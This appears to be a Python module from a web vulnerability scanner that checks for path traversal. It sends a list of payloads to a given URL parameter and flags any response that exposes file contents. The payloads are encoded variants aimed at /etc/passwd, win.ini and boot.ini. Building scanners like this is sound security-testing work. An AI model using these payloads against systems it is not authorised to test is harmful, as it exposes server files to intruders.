"""
Path Traversal vulnerability scanner module.
"""

import aiohttp
from backend.core.evidence import EvidenceLogger


class TraversalProbe:
    def __init__(self, base_url: str, session: aiohttp.ClientSession, logger: EvidenceLogger):
        self.base_url = base_url.rstrip("/")
        self.session = session
        self.logger = logger

        # Path traversal payloads
        self.payloads = [
            "../../../../../../etc/passwd",
            "..\\..\\..\\..\\windows\\win.ini",
            "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
            "%252e%252e%252fetc%252fpasswd",
            "..%5c..%5c..%5cboot.ini",
        ]

    async def scan(self, param: str):
        """
        Scan a given parameter for path traversal vulnerability.
        """
        for payload in self.payloads:
            target = f"{self.base_url}?{param}={payload}"
            try:
                async with self.session.get(target, timeout=10) as resp:
                    text = await resp.text()
                    if "root:" in text or "[extensions]" in text or "[fonts]" in text:
                        self.logger.log_finding(
                            category="Traversal",
                            url=target,
                            evidence="Possible path traversal (file contents exposed)",
                            severity="High"
                        )
                        return True
            except Exception as e:
                self.logger.log_error("TraversalProbe", str(e))
        return False
